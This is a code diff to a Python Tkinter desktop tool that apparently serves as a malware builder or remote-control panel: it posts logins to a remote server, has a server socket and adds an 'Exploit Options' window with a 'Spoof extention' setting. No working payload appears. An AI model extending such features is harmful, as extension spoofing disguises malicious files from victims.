@@ -178,7 +178,7 @@ class Login(Tk):
 
         payload = {'user': self.options['username'].get(), 'pwd': check_pwd}
 
-        r = requests.post('https://zeznzo.nl/login.py', params=payload)
+        r = requests.post('https://zeznzo.nl/login.py', data=payload)
         if r.status_code == 200:
             if r.text.startswith('[ERROR]'):
                 messagebox.showwarning('ERROR', r.text.split('[ERROR] ')[1])
@@ -257,7 +257,7 @@ class Login(Tk):
         try:
             payload = {'user': self.options['reg_username'].get(), 'pwd': hashlib.sha256(self.options['reg_password'].get().encode('utf-8')).hexdigest()}
 
-            r = requests.post('https://zeznzo.nl/reg.py', params=payload)
+            r = requests.post('https://zeznzo.nl/reg.py', data=payload)
             if r.status_code == 200:
                 if r.text.startswith('[ERROR]'):
                     messagebox.showwarning('ERROR', r.text.split('[ERROR] ')[1])
@@ -631,6 +631,15 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         upg = Button(self.prof, text = "UPGRADE", command = self.upgrade, width = 53)
         upg.grid(row = 7, column = 0, columnspan = 2)
 
+    def exploit_options(self):
+        self.exp = Toplevel()
+        self.exp.title(string = 'Exploit Options')
+        self.exp.configure(background = 'white')
+        self.exp.resizable(0,0)
+
+        self.bind("<Escape>", self.close_exploit) # Press ESC to quit app
+
+        Label(self.exp, text = 'Spoof extention', background = 'white').grid(row = 0, column = 0)
 
 
     def open_server(self):
@@ -1263,6 +1272,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def close_profile(self, event):
         self.prof.destroy()
+
+    def close_exploit(self, event):
+        self.exp.destroy()
 
     def close_server(self, event):
         self.server_socket.close()
